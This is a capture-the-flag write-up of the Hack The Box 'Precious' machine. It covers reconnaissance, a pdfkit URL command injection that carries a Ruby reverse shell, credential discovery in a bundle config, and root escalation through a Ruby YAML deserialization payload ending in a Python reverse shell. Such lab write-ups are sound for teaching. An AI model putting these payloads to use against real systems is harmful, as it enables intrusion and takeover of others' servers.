# Precious | HTB
### Difficulty: Easy
----------------------------

First let's use nmap to scan the system:

```bash
nmap -p- -T4 -A <machine-ip> -oN precious.nmap
```

-p- Scans all ports instead of just scanning common 1000 ports.

-T4 - Increase the speed of the scan.

-A - Aggressive scan.

-oN - Saves the outoput into a file.

Results:

```bash
Nmap scan report for precious.htb (10.10.11.189)                                                               
Host is up (0.12s latency).                                                                                    
Not shown: 65511 closed tcp ports (reset)                                                                      
PORT      STATE    SERVICE VERSION                                                                             
22/tcp    open     ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)                                       
| ssh-hostkey:                                                                                                 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)                                                 
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp    open     http    nginx 1.18.0
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
|_http-title: Convert Web Page to PDF
120/tcp   filtered cfdptkt
4752/tcp  filtered snap
13206/tcp filtered unknown
17685/tcp filtered unknown
19600/tcp filtered unknown
21236/tcp filtered unknown
26206/tcp filtered unknown
31409/tcp filtered unknown
34118/tcp filtered unknown
34951/tcp filtered unknown
37111/tcp filtered unknown
37505/tcp filtered unknown
37679/tcp filtered unknown
42550/tcp filtered unknown
44178/tcp filtered unknown
47497/tcp filtered unknown
48499/tcp filtered unknown
48733/tcp filtered unknown
51570/tcp filtered unknown
54124/tcp filtered unknown
61063/tcp filtered unknown
63516/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/16%OT=22%CT=1%CU=33358%PV=Y%DS=2%DC=T%G=Y%TM=65F5
OS:BB72%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=103%GCD=1%ISR=10C%TI
OS:=Z%CI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FA
OS:%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=
OS:M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE
OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   92.22 ms 10.10.14.1
2   92.29 ms precious.htb (10.10.11.189)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 498.05 seconds
```

There are a lot of ports out there.
The main ports are:

22 - SSH

80 - HTTP

120 - cfdptkt

4752 - snap 

The systen runs http service on nginx server version 1.18.0 
and uses Phusion Passenger(R) 6.0.15

browse it:

![image](https://cdn-images-1.medium.com/max/1000/1*l6BqmwAC8AzKiDd5Egt7Vw.png)

Use gobuster to find out directories within the system.

```bash
gobuster dir -u http://precious.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Gobuster didn't find any directory.

Let's use banner grabbing to gather more information about the system.

```bash
wget http://precious.htb -q -S

THE RESULTS:
HTTP/1.1 200 OK
  Content-Type: text/html;charset=utf-8
  Content-Length: 483
  Connection: keep-alive
  Status: 200 OK
  X-XSS-Protection: 1; mode=block
  X-Content-Type-Options: nosniff
  X-Frame-Options: SAMEORIGIN
  Date: Sat, 16 Mar 2024 16:15:34 GMT
  X-Powered-By: Phusion Passenger(R) 6.0.15
  Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
  X-Runtime: Ruby
```
The application uses ruby.

I tried to submit a url addrress but i got this error:
```
“Cannot load remote URL!”
```
So, I understood that the url supposed to come from the localhost. yeah. it's me.
create a test file to upload it to the converter and get it on pdf.

```
echo 'text' > text.txt 
```
Then open python http server within the directory that the file is located with:

```
python3 -m http.server
```
Inside the url to fetch enter your ip-address (tun) with the port number and 
make a request to get the file.

```
http://<ip-address>:8000/text.txt
```

After submitting it, the file will be downloaded to your machine as pdf.

![image](https://cdn-images-1.medium.com/max/1000/1*Rf0Wfx7US2Yk-ldr9ZoyUg.png)

Ok, so there is a pdf file. Let's use exiftool to gather more information about the file.

THE RESULTS:

```bash
exiftool rl89tmzxiysk8yg4fdnj4oq64iiw6hpe.pdf 
ExifTool Version Number         : 12.76
File Name                       : rl89tmzxiysk8yg4fdnj4oq64iiw6hpe.pdf
Directory                       : .
File Size                       : 9.8 kB
File Modification Date/Time     : 2024:03:16 12:50:42-04:00
File Access Date/Time           : 2024:03:16 12:50:42-04:00
File Inode Change Date/Time     : 2024:03:16 12:50:42-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

It's generated by pdfkit v0.8.6
Check if there is any vulnerability that relates to it.

![image](https://cdn-images-1.medium.com/max/1000/1*PKlhHA73_RXcs9J3OFL_hQ.png)

There is. But it's not the same version of pdfkit.

Ill pull it althought I know it's not the version, but maybe Ill find out that is ok:

```
searchsploit -m 51293.py
```

While reading the exploit there is description that answer the question.

```
# Description: The package pdfkit from 0.0.0 are vulnerable to Command Injection where the URL is not properly sanitized.
```

So, I guess it will work.

run the script with -h flag to get information about how to use it.

```bash
python3 51293.py -h    
UNICORD Exploit for CVE-2022–25765 (pdfkit) - Command Injection

Usage:
  python3 exploit-CVE-2022–25765.py -c <command>
  python3 exploit-CVE-2022–25765.py -s <local-IP> <local-port>
  python3 exploit-CVE-2022–25765.py -c <command> [-w <http://target.com/index.html> -p <parameter>]
  python3 exploit-CVE-2022–25765.py -s <local-IP> <local-port> [-w <http://target.com/index.html> -p <parameter>]
  python3 exploit-CVE-2022–25765.py -h

Options:
  -c    Custom command mode. Provide command to generate custom payload with.
  -s    Reverse shell mode. Provide local IP and port to generate reverse shell payload with.
  -w    URL of website running vulnerable pdfkit. (Optional)
  -p    POST parameter on website running vulnerable pdfkit. (Optional)
  -h    Show this help men
```

There is reverse shell mode. Use -s flag.
After few attempts I recognized that isn't going to work. :(
Let's find another cve.

https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

Let's make the poc shorter for you.

There is an option to run command on the system by:

```bash
http%20`<command here>`
```
%20 is just an encoded space.

Ill use ruby reverse shell trying get one on my machine.

```bash
<http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.18",4444))'`
```

set netcat listener:

```bash
nc -lnvp 4444
```

and there is a shell:

![image](https://cdn-images-1.medium.com/max/1000/1*qSNy4j9xm5WaSoRq5PjuYg.png)

Stabilize it with:

```bash
/bin/bash -i
```

while enumaration I found /home/ruby/.bundle/config which includes username and password:

```bash
ruby@precious:~$ cd .bundle
cd .bundle
ruby@precious:~/.bundle$ ls
ls
config
ruby@precious:~/.bundle$ cd config
cd config
bash: cd: config: Not a directory
ruby@precious:~/.bundle$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:******************"

```
Remember there is ssh service open so try to connect the user henry.

```bash
ssh henry@precious.htb
```
enter the password

and we are in as henry.

![image](https://cdn-images-1.medium.com/max/1000/1*MtOF9RFZTXrJ3GWunIchoA.png)

check which files henry can run as root with:

```bash
sudo -l

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

After cat the file I saw it needs dependencies to execute.

![image](https://cdn-images-1.medium.com/max/1000/1*X2VI9OMxHQnCs05ZCoPejQ.png)


after trying to run the file I got an error. I decided to read more about aribtrary code execution vulnerability on yaml ruby. 


https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565?ref=blog.stratumsecurity.com#file-ruby_yaml_load_sploit2-yaml


There is explanation how to exploit ruby file desirialization.
So, take the payload and name it as the same as "dependencies.yml"
on another directory:

```bash
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -c 'ping <ip-address>'"
         method_id: :resolve

```

on git_Set : enter the command you want to try.

then, run 'sudo /usr/bin/ruby /opt/update_dependencies.rb' 
within the directory that include the new yaml 
dependency file that has been created.

that's what i set:

```
git_set: "bash -c 'ping <ip-address>'"
```

after running the .rb file, the ping command worked.

![image](https://cdn-images-1.medium.com/max/1000/1*8VNAnSBAcHC7DTaD8ZbzmA.png)

which means that the payload works.

I changed the git_set to read the root.txt inside root directory.

```
git_set: cat /root/root.txt
```

and root.txt has been obtained.

If you want to get full access as root within the machine,
just change the git_set to run python reverse shell code.
set a netcat listener on your machine, then run the update file again 
to get a reverse shell as root.

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<tun-ip",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

and there is a shell as root!

![image](https://cdn-images-1.medium.com/max/1000/1*9f0q6ovf40ejfQlZO8jrYQ.png)

That's it.

***Written by Alon Presman, Penetration Tester and Ethical Hacker.***



















































